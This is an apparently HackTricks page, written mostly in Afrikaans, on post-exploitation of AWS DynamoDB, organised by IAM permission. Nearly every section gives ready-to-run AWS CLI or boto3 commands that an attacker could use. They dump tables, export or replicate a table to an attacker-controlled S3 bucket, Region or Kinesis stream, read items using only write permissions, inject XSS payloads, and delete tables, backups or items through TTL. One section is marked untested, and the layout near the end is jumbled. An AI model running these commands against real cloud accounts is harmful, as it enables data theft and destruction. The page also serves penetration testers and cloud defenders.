# AWS - DynamoDB Post Exploitation

{{#include ../../../../banners/hacktricks-training.md}}

## DynamoDB

Vir meer inligting sien:

{{#ref}}
../../aws-services/aws-dynamodb-enum.md
{{#endref}}

### `dynamodb:BatchGetItem`

'n Aanvaller met hierdie toestemming sal in staat wees om **items uit tabelle te kry op grond van die primêre sleutel** (jy kan nie net al die data van die tabel opvra nie). Dit beteken dat jy die primêre sleutels moet ken (jy kan dit kry deur die tabelmetadata te bekom (`describe-table`).

{{#tabs }}
{{#tab name="json file" }}
```bash
aws dynamodb batch-get-item --request-items file:///tmp/a.json

// With a.json
{
"ProductCatalog" : { // This is the table name
"Keys": [
{
"Id" : { // Primary keys name
"N": "205" // Value to search for, you could put here entries from 1 to 1000 to dump all those
}
}
]
}
}
```
{{#endtab }}

{{#tab name="inline" }}
```bash
aws dynamodb batch-get-item \
--request-items '{"TargetTable": {"Keys": [{"Id": {"S": "item1"}}, {"Id": {"S": "item2"}}]}}' \
--region <region>
```
{{#endtab }}
{{#endtabs }}

**Potensiële impak:** Indirek privesc deur sensitiewe inligting in die tabel te vind

### `dynamodb:GetItem`

**Soortgelyk aan die vorige permissies** laat hierdie een 'n potensiële aanvaller toe om waardes uit slegs 1 tabel te lees, gegewe die primêre sleutel van die inskrywing wat opgehaal moet word:
```json
aws dynamodb get-item --table-name ProductCatalog --key  file:///tmp/a.json

// With a.json
{
"Id" : {
"N": "205"
}
}
```
Met hierdie toestemming is dit ook moontlik om die **`transact-get-items`** metode soos volg te gebruik:
```json
aws dynamodb transact-get-items \
--transact-items file:///tmp/a.json

// With a.json
[
{
"Get": {
"Key": {
"Id": {"N": "205"}
},
"TableName": "ProductCatalog"
}
}
]
```
**Potential Impact:** Indirekte privesc deur sensitiewe inligting in die tabel te vind

### `dynamodb:Query`

**Soortgelyk aan die vorige permissies** hierdie een laat 'n potensiële aanvaller toe om waardes van slegs 1 tabel te lees, gegee die primêre sleutel van die inskrywing wat opgehaal moet word. Dit laat toe om 'n [subset of comparisons](https://docs.aws.amazon.com/amazondynamodb/latest/APIReference/API_Condition.html) te gebruik, maar die enigste vergelyking wat met die primêre sleutel (wat moet verskyn) toegelaat word is "EQ", dus kan jy nie 'n vergelyking gebruik om die hele DB in 'n versoek te kry nie.

{{#tabs }}
{{#tab name="json file" }}
```bash
aws dynamodb query --table-name ProductCatalog --key-conditions file:///tmp/a.json

// With a.json
{
"Id" : {
"ComparisonOperator":"EQ",
"AttributeValueList": [ {"N": "205"} ]
}
}
```
{{#endtab }}

{{#tab name="inline" }}
```bash
aws dynamodb query \
--table-name TargetTable \
--key-condition-expression "AttributeName = :value" \
--expression-attribute-values '{":value":{"S":"TargetValue"}}' \
--region <region>
```
{{#endtab }}
{{#endtabs }}

**Potensiële impak:** Indirekte privesc deur sensitiewe inligting in die tabel te vind

### `dynamodb:Scan`

Jy kan hierdie toestemming gebruik om die hele tabel maklik te **dump**.
```bash
aws dynamodb scan --table-name <t_name> #Get data inside the table
```
**Potensiële impak:** Indirekte privesc deur gevoelige inligting in die tabel te lokaliseer

### `dynamodb:PartiQLSelect`

Jy kan hierdie toestemming gebruik om **die hele tabel maklik te dump**.
```bash
aws dynamodb execute-statement \
--statement "SELECT * FROM ProductCatalog"
```
Hierdie toestemming laat ook toe om `batch-execute-statement` uit te voer, soos:
```bash
aws dynamodb batch-execute-statement \
--statements '[{"Statement": "SELECT * FROM ProductCatalog WHERE Id = 204"}]'
```
maar jy moet die primêre sleutel met 'n waarde spesifiseer, so dit is nie baie nuttig nie.

**Potensiële impak:** Indirect privesc deur sensitiewe inligting in die tabel te lokaliseer

### `dynamodb:ExportTableToPointInTime|(dynamodb:UpdateContinuousBackups)`

Hierdie toestemming sal 'n aanvaller toelaat om die hele tabel na 'n S3-bucket van sy keuse te **eksporteer**:
```bash
aws dynamodb export-table-to-point-in-time \
--table-arn arn:aws:dynamodb:<region>:<account-id>:table/TargetTable \
--s3-bucket <attacker_s3_bucket> \
--s3-prefix <optional_prefix> \
--export-time <point_in_time> \
--region <region>
```
Let daarop: vir dit om te werk moet die tabel point-in-time-recovery ingeskakel wees. Jy kan nagaan of die tabel dit het met:
```bash
aws dynamodb describe-continuous-backups \
--table-name <tablename>
```
As dit nie aangeskakel is nie, sal jy dit moet **aanskakel** en daarvoor het jy die **`dynamodb:ExportTableToPointInTime`** toestemming nodig:
```bash
aws dynamodb update-continuous-backups \
--table-name <value> \
--point-in-time-recovery-specification PointInTimeRecoveryEnabled=true
```
**Potential Impact:** Indirect privesc deur sensitiewe inligting in die tabel te lokaliseer

### `dynamodb:CreateTable`, `dynamodb:RestoreTableFromBackup`, (`dynamodb:CreateBackup)`

Met hierdie toestemmings sou 'n aanvaller in staat wees om **'n nuwe tabel vanaf 'n rugsteun te skep** (of selfs 'n rugsteun te skep om dit dan in 'n ander tabel te herstel). Dan, met die nodige toestemmings, sou hy in staat wees om **inligting** uit die rugsteune te kontroleer wat n**ie meer in die produksie** tabel is nie.
```bash
aws dynamodb restore-table-from-backup \
--backup-arn <source-backup-arn> \
--target-table-name <new-table-name> \
--region <region>
```
**Potential Impact:** Indirect privesc deur sensitiewe inligting in die tabel-rugsteun te lokaliseer

### `dynamodb:PutItem`

Hierdie toestemming laat gebruikers toe om 'n **nuwe item by die tabel te voeg of 'n bestaande item met 'n nuwe item te vervang**.

As 'n item met dieselfde primêre sleutel reeds bestaan, sal die **gehele item vervang word** deur die nuwe item. As die primêre sleutel nie bestaan nie, sal 'n nuwe item met die gespesifiseerde primêre sleutel **geskep** word.

{{#tabs }}
{{#tab name="XSS Example" }}
```bash
## Create new item with XSS payload
aws dynamodb put-item --table <table_name> --item file://add.json
### With add.json:
{
"Id": {
"S": "1000"
},
"Name": {
"S":  "Marc"
},
"Description": {
"S": "<script>alert(1)</script>"
}
}
```
{{#endtab }}

{{#tab name="AI Example" }}
```bash
aws dynamodb put-item \
--table-name ExampleTable \
--item '{"Id": {"S": "1"}, "Attribute1": {"S": "Value1"}, "Attribute2": {"S": "Value2"}}' \
--region <region>
```
{{#endtab }}
{{#endtabs }}

**Potensiële impak:** Uitbuiting van verdere vulnerabilities/bypasses deur die vermoë om data in 'n DynamoDB-tabel by te voeg of te wysig

### `dynamodb:UpdateItem`

Hierdie toestemming laat gebruikers toe om die bestaande eienskappe van 'n item te **wysig of nuwe eienskappe aan 'n item toe te voeg**. Dit **vervang nie** die hele item nie; dit werk slegs die gespesifiseerde eienskappe by. Indien die primêre sleutel nie in die tabel bestaan nie, sal die operasie 'n **nuwe item skep** met die gespesifiseerde primêre sleutel en die eienskappe stel soos gespesifiseer in die update expression.

{{#tabs }}
{{#tab name="XSS Example" }}
```bash
## Update item with XSS payload
aws dynamodb update-item --table <table_name> \
--key file://key.json --update-expression "SET Description = :value" \
--expression-attribute-values file://val.json
### With key.json:
{
"Id": {
"S": "1000"
}
}
### and val.json
{
":value": {
"S": "<script>alert(1)</script>"
}
}
```
{{#endtab }}

{{#tab name="AI Example" }}
```bash
aws dynamodb update-item \
--table-name ExampleTable \
--key '{"Id": {"S": "1"}}' \
--update-expression "SET Attribute1 = :val1, Attribute2 = :val2" \
--expression-attribute-values '{":val1": {"S": "NewValue1"}, ":val2": {"S": "NewValue2"}}' \
--region <region>
```
{{#endtab }}
{{#endtabs }}

**Potensiële impak:** Eksploitasie van verdere vulnerabilities/bypasses deur in staat te wees om data by te voeg/wysig in 'n DynamoDB-tabel

### `dynamodb:DeleteTable`

'n aanvaller met hierdie toestemming kan **'n DynamoDB-tabel uitvee, wat dataverlies veroorsaak**.
```bash
aws dynamodb delete-table \
--table-name TargetTable \
--region <region>
```
**Potensiële impak**: Dataverlies en ontwrigting van dienste wat op die verwyderde tabel staatmaak.

### `dynamodb:DeleteBackup`

'n aanvaller met hierdie toestemming kan **'n DynamoDB-rugsteun verwyder, wat moontlik tot dataverlies kan lei in geval van 'n rampherwinningscenario**.
```bash
aws dynamodb delete-backup \
--backup-arn arn:aws:dynamodb:<region>:<account-id>:table/TargetTable/backup/BACKUP_ID \
--region <region>
```
**Potensiële impak**: Dataverlies en die onvermoë om vanaf 'n rugsteun te herstel tydens 'n rampherstel-scenario.

### `dynamodb:StreamSpecification`, `dynamodb:UpdateTable`, `dynamodb:DescribeStream`, `dynamodb:GetShardIterator`, `dynamodb:GetRecords`

> [!NOTE]
> TODO: Toets of dit werklik werk

Met hierdie toestemmings kan 'n aanvaller **aktiveer 'n stream op 'n DynamoDB-tabel, die tabel opdateer om veranderinge te begin stream, en dan toegang tot die stream kry om veranderinge aan die tabel in reële tyd te monitor**. Dit stel die aanvaller in staat om dataveranderinge te monitor en te exfiltreer, wat moontlik tot data leakage kan lei.

1. Aktiveer 'n stream op 'n DynamoDB-tabel:
```bash
aws dynamodb update-table \
--table-name TargetTable \
--stream-specification StreamEnabled=true,StreamViewType=NEW_AND_OLD_IMAGES \
--region <region>
```
2. Beskryf die stream om die ARN en ander besonderhede te verkry:
```bash
aws dynamodb describe-stream \
--table-name TargetTable \
--region <region>
```
3. Kry die shard iterator met behulp van die stream ARN:
```bash
aws dynamodbstreams get-shard-iterator \
--stream-arn <stream_arn> \
--shard-id <shard_id> \
--shard-iterator-type LATEST \
--region <region>
```
4. Gebruik die shard iterator om toegang tot data op die stream te kry en dit te exfiltrate:
```bash
aws dynamodbstreams get-records \
--shard-iterator <shard_iterator> \
--region <region>
```
**Potensiële impak**: Reële-tydmonitering en data leakage van die veranderinge in die DynamoDB-tabel.

### Lees items via `dynamodb:UpdateItem` and `ReturnValues=ALL_OLD`

'n aanvaller met slegs `dynamodb:UpdateItem` op 'n tabel kan items lees sonder enige van die gewone lees-toestemmings (`GetItem`/`Query`/`Scan`) deur 'n onskuldige update uit te voer en `--return-values ALL_OLD` aan te vra. DynamoDB sal die volledige pre-update beeld van die item in die `Attributes` field van die response teruggee (dit verbruik nie RCUs nie).

- Minimum permissions: `dynamodb:UpdateItem` on the target table/key.
- Vereistes: Jy moet die item se primêre sleutel ken.

Voorbeeld (voeg 'n onskadelike attribuut by en exfiltrates die vorige item in die reaksie):
```bash
aws dynamodb update-item \
--table-name <TargetTable> \
--key '{"<PKName>":{"S":"<PKValue>"}}' \
--update-expression 'SET #m = :v' \
--expression-attribute-names '{"#m":"exfil_marker"}' \
--expression-attribute-values '{":v":{"S":"1"}}' \
--return-values ALL_OLD \
--region <region>
```
Die CLI-antwoord sal 'n `Attributes`-blok bevat wat die volledige vorige item (alle attributes) insluit, en sodoende effektief 'n read primitive van write-only toegang bied.

**Potential Impact:** Lees arbitrêre items uit 'n tabel met slegs write permissions, wat gevoelige data exfiltration moontlik maak wanneer primary keys bekend is.


### `dynamodb:UpdateTable (replica-updates)` | `dynamodb:CreateTableReplica`

Stealth exfiltration deur 'n nuwe replica Region by 'n DynamoDB Global Table (version 2019.11.21) te voeg. As 'n principal 'n regionale replica kan byvoeg, word die hele tabel na die deur die aanvaller gekose Region gerepliseer, vanwaar die aanvaller alle items kan lees.

{{#tabs }}
{{#tab name="PoC (default DynamoDB-managed KMS)" }}
```bash
# Add a new replica Region (from primary Region)
aws dynamodb update-table \
--table-name <TableName> \
--replica-updates '[{"Create": {"RegionName": "<replica-region>"}}]' \
--region <primary-region>

# Wait until the replica table becomes ACTIVE in the replica Region
aws dynamodb describe-table --table-name <TableName> --region <replica-region> --query 'Table.TableStatus'

# Exfiltrate by reading from the replica Region
aws dynamodb scan --table-name <TableName> --region <replica-region>
```
{{#endtab }}
{{#tab name="PoC (customer-managed KMS)" }}
```bash
# Specify the CMK to use in the replica Region
aws dynamodb update-table \
--table-name <TableName> \
--replica-updates '[{"Create": {"RegionName": "<replica-region>", "KMSMasterKeyId": "arn:aws:kms:<replica-region>:<account-id>:key/<cmk-id>"}}]' \
--region <primary-region>
```
{{#endtab }}
{{#endtabs }}

Toestemmings: `dynamodb:UpdateTable` (met `replica-updates`) of `dynamodb:CreateTableReplica` op die teiken-tabel. As CMK in die replica gebruik word, mag KMS-permissies vir daardie sleutel vereis word.

Potensiële impak: Full-table replication na 'n aanvaller-beheerde Region wat lei tot stealthy data exfiltration.

### `dynamodb:TransactWriteItems` (read via failed condition + `ReturnValuesOnConditionCheckFailure=ALL_OLD`)

'n aanvaller met transactional write privileges kan die volledige attributes van 'n bestaande item exfiltrate deur 'n `Update` binne `TransactWriteItems` uit te voer wat opsetlik 'n `ConditionExpression` laat misluk terwyl `ReturnValuesOnConditionCheckFailure=ALL_OLD` gestel is. By mislukking sluit `DynamoDB` die vorige attributes in die transaksie-kansellasie-redes in, wat effektief write-only access in read access van geteikende sleutels omskakel.

{{#tabs }}
{{#tab name="PoC (AWS CLI >= supports cancellation reasons)" }}
```bash
# Create the transaction input (list form for --transact-items)
cat > /tmp/tx_items.json << 'JSON'
[
{
"Update": {
"TableName": "<TableName>",
"Key": {"<PKName>": {"S": "<PKValue>"}},
"UpdateExpression": "SET #m = :v",
"ExpressionAttributeNames": {"#m": "marker"},
"ExpressionAttributeValues": {":v": {"S": "x"}},
"ConditionExpression": "attribute_not_exists(<PKName>)",
"ReturnValuesOnConditionCheckFailure": "ALL_OLD"
}
}
]
JSON

# Execute. Newer AWS CLI versions support returning cancellation reasons
aws dynamodb transact-write-items \
--transact-items file:///tmp/tx_items.json \
--region <region> \
--return-cancellation-reasons
# The command fails with TransactionCanceledException; parse cancellationReasons[0].Item
```
{{#endtab }}
{{#tab name="PoC (boto3)" }}
```python
import boto3
c=boto3.client('dynamodb',region_name='<region>')
try:
c.transact_write_items(TransactItems=[{ 'Update': {
'TableName':'<TableName>',
'Key':{'<PKName>':{'S':'<PKValue>'}},
'UpdateExpression':'SET #m = :v',
'ExpressionAttributeNames':{'#m':'marker'},
'ExpressionAttributeValues':{':v':{'S':'x'}},
'ConditionExpression':'attribute_not_exists(<PKName>)',
'ReturnValuesOnConditionCheckFailure':'ALL_OLD'}}])
except c.exceptions.TransactionCanceledException as e:
print(e.response['CancellationReasons'][0]['Item'])
```
{{#endtab }}
{{#endtabs }}

Permissies: `dynamodb:TransactWriteItems` on the target table (and the underlying item). No read permissions are required.

Potensiële impak: Lees ewekansige items (per primêre sleutel) van 'n tabel slegs met transaksionele skryfregte deur die teruggegewe kanselleringsredes.


### `dynamodb:UpdateTable` + `dynamodb:UpdateItem` + `dynamodb:Query` op GSI

Om leesbeperkings te omseil, skep 'n Global Secondary Index (GSI) met `ProjectionType=ALL` op 'n lae-entropie attribuut, stel daardie attribuut op 'n konstante waarde oor items, en `Query` dan die index om volledige items te kry. Dit werk selfs as `Query`/`Scan` op die basistabel geweier is, solank jy die index ARN kan query.

- Minimum permissies:
- `dynamodb:UpdateTable` op die teiken-tabel (om die GSI met `ProjectionType=ALL` te skep).
- `dynamodb:UpdateItem` op die teiken-tabel sleutels (om die geïndekseerde attribuut op elke item te stel).
- `dynamodb:Query` op die index resource ARN (`arn:aws:dynamodb:<region>:<account-id>:table/<TableName>/index/<IndexName>`).

Stappe (PoC in us-east-1):
```bash
# 1) Create table and seed items (without the future GSI attribute)
aws dynamodb create-table --table-name HTXIdx \
--attribute-definitions AttributeName=id,AttributeType=S \
--key-schema AttributeName=id,KeyType=HASH \
--billing-mode PAY_PER_REQUEST --region us-east-1
aws dynamodb wait table-exists --table-name HTXIdx --region us-east-1
for i in 1 2 3 4 5; do \
aws dynamodb put-item --table-name HTXIdx \
--item "{\"id\":{\"S\":\"$i\"},\"secret\":{\"S\":\"sec-$i\"}}" \
--region us-east-1; done

# 2) Add GSI on attribute X with ProjectionType=ALL
aws dynamodb update-table --table-name HTXIdx \
--attribute-definitions AttributeName=X,AttributeType=S \
--global-secondary-index-updates '[{"Create":{"IndexName":"ExfilIndex","KeySchema":[{"AttributeName":"X","KeyType":"HASH"}],"Projection":{"ProjectionType":"ALL"}}}]' \
--region us-east-1
# Wait for index to become ACTIVE
aws dynamodb describe-table --table-name HTXIdx --region us-east-1 \
--query 'Table.GlobalSecondaryIndexes[?IndexName==`ExfilIndex`].IndexStatus'

# 3) Set X="dump" for each item (only UpdateItem on known keys)
for i in 1 2 3 4 5; do \
aws dynamodb update-item --table-name HTXIdx \
--key "{\"id\":{\"S\":\"$i\"}}" \
--update-expression 'SET #x = :v' \
--expression-attribute-names '{"#x":"X"}' \
--expression-attribute-values '{":v":{"S":"dump"}}' \
--region us-east-1; done

# 4) Query the index by the constant value to retrieve full items
aws dynamodb query --table-name HTXIdx --index-name ExfilIndex \
--key-condition-expression '#x = :v' \
--expression-attribute-names '{"#x":"X"}' \
--expression-attribute-values '{":v":{"S":"dump"}}' \
--region us-east-1
```
**Potensiële impak:** Full table exfiltration deur 'n nuut geskepte GSI te bevraagteken wat alle attributte projekteer, selfs wanneer die base table read APIs geweier word.


### `dynamodb:EnableKinesisStreamingDestination` (Continuous exfiltration via Kinesis Data Streams)

Misbruik van DynamoDB Kinesis streaming destinations om veranderinge van 'n tabel deurlopend te exfiltrate na 'n Kinesis Data Stream wat deur die aanvaller beheer word. Sodra dit geaktiveer is, word elke INSERT/MODIFY/REMOVE gebeurtenis naby real-time na die stroom vooruitgestuur sonder dat lees-toestemmings op die tabel nodig is.

Minimum toestemmings (aanvaller):
- `dynamodb:EnableKinesisStreamingDestination` op die teikentabel
- Opsioneel `dynamodb:DescribeKinesisStreamingDestination`/`dynamodb:DescribeTable` om die status te monitor
- Lees-toestemmings op die Kinesis-stroom wat deur die aanvaller beheer word om rekords te verbruik: `kinesis:*`

<details>
<summary>PoC (us-east-1)</summary>
```bash
# 1) Prepare: create a table and seed one item
aws dynamodb create-table --table-name HTXKStream \
--attribute-definitions AttributeName=id,AttributeType=S \
--key-schema AttributeName=id,KeyType=HASH \
--billing-mode PAY_PER_REQUEST --region us-east-1
aws dynamodb wait table-exists --table-name HTXKStream --region us-east-1
aws dynamodb put-item --table-name HTXKStream \
--item file:///tmp/htx_item1.json --region us-east-1
# /tmp/htx_item1.json
# {"id":{"S":"a1"},"secret":{"S":"s-1"}}

# 2) Create attacker Kinesis Data Stream
aws kinesis create-stream --stream-name htx-ddb-exfil --shard-count 1 --region us-east-1
aws kinesis wait stream-exists --stream-name htx-ddb-exfil --region us-east-1

# 3) Enable the DynamoDB -> Kinesis streaming destination
STREAM_ARN=$(aws kinesis describe-stream-summary --stream-name htx-ddb-exfil \
--region us-east-1 --query StreamDescriptionSummary.StreamARN --output text)
aws dynamodb enable-kinesis-streaming-destination \
--table-name HTXKStream --stream-arn "$STREAM_ARN" --region us-east-1
# Optionally wait until ACTIVE
aws dynamodb describe-kinesis-streaming-destination --table-name HTXKStream \
--region us-east-1 --query KinesisDataStreamDestinations[0].DestinationStatus

# 4) Generate changes on the table
aws dynamodb put-item --table-name HTXKStream \
--item file:///tmp/htx_item2.json --region us-east-1
# /tmp/htx_item2.json
# {"id":{"S":"a2"},"secret":{"S":"s-2"}}
aws dynamodb update-item --table-name HTXKStream \
--key file:///tmp/htx_key_a1.json \
--update-expression "SET #i = :v" \
--expression-attribute-names {#i:info} \
--expression-attribute-values {:v:{S:updated}} \
--region us-east-1
# /tmp/htx_key_a1.json -> {"id":{"S":"a1"}}

# 5) Consume from Kinesis to observe DynamoDB images
SHARD=$(aws kinesis list-shards --stream-name htx-ddb-exfil --region us-east-1 \
--query Shards[0].ShardId --output text)
IT=$(aws kinesis get-shard-iterator --stream-name htx-ddb-exfil --shard-id "$SHARD" \
--shard-iterator-type TRIM_HORIZON --region us-east-1 --query ShardIterator --output text)
aws kinesis get-records --shard-iterator "$IT" --limit 10 --region us-east-1 > /tmp/krec.json
# Decode one record (Data is base64-encoded)
jq -r .Records[0].Data /tmp/krec.json | base64 --decode | jq .

# 6) Cleanup (recommended)
aws dynamodb disable-kinesis-streaming-destination \
--table-name HTXKStream --stream-arn "$STREAM_ARN" --region us-east-1 || true
aws kinesis delete-stream --stream-name htx-ddb-exfil --enforce-consumer-deletion --region us-east-1 || true
aws dynamodb delete-table --table-name HTXKStream --region us-east-1 || true
```
### `dynamodb:UpdateTimeToLive`

'n aanvaller met die dynamodb:UpdateTimeToLive-magtiging kan die TTL (vervaltyd) konfigurasie van 'n tabel verander — TTL inskakel of afskakel. Wanneer TTL aangeskakel is, sal individuele items wat die gekonfigureerde TTL-attribuut bevat, outomaties uitgevee word sodra hul vervaltyd bereik is. Die TTL-waarde is net 'n ander attribuut op elke item; items sonder daardie attribuut word nie deur TTL-gebaseerde verwydering geraak nie.

As items nie reeds die TTL-attribuut bevat nie, sal die aanvaller ook 'n magtiging benodig wat items opdateer (byvoorbeeld `dynamodb:UpdateItem`) om die TTL-attribuut by te voeg en massasverwyderings te veroorsaak.

Eers, skakel TTL op die tabel aan en spesifiseer die attribuutnaam wat vir verval gebruik moet word:
```bash
aws dynamodb update-time-to-live \
--table-name <TABLE_NAME> \
--time-to-live-specification "Enabled=true, AttributeName=<TTL_ATTRIBUTE_NAME>"
```
Werk dan items by om die TTL attribuut (epoch seconds) by te voeg sodat hulle verstryk en verwyder sal word:
```bash
aws dynamodb update-item \
--table-name <TABLE_NAME> \
--key '<PRIMARY_KEY_JSON>' \
--update-expression "SET <TTL_ATTRIBUTE_NAME> = :t" \
--expression-attribute-values '{":t":{"N":"<EPOCH_SECONDS_VALUE>"}}'
```
### `dynamodb:RestoreTableFromAwsBackup` & `dynamodb:RestoreTableToPointInTime`

'n Aanvaller met dynamodb:RestoreTableFromAwsBackup of dynamodb:RestoreTableToPointInTime regte kan nuwe tafels skep wat uit rugsteun of uit punt‑in‑tyd herstel (PITR) herstel is sonder om die oorspronklike tabel oor te skryf. Die herstelde tabel bevat 'n volledige beeld van die data op die gekose tydpunt, sodat die aanvaller dit kan gebruik om historiese inligting te exfiltrate of om 'n volledige dump van die databasis se vorige toestand te verkry.

Herstel 'n DynamoDB-tabel vanaf 'n op-aanvraag-rugsteun:
```bash
aws dynamodb restore-table-from-backup \
--target-table-name <NEW_TABLE_NAME> \
--backup-arn <BACKUP_ARN>
```
Herstel 'n DynamoDB-tabel na 'n spesifieke tydpunt (skep 'n nuwe tabel met die herstelde staat):
```bash
aws dynamodb restore-table-to-point-in-time \
--source-table-name <SOURCE_TABLE_NAME> \
--target-table-name <NEW_TABLE_NAME> \
--use-latest-restorable-time
````
</details>

**Potensiële impak:** Deurlopende, byna regstreekse exfiltration van tabelveranderinge na 'n attacker-controlled Kinesis stream sonder direkte leesoperasies op die tabel.



{{#include ../../../../banners/hacktricks-training.md}}
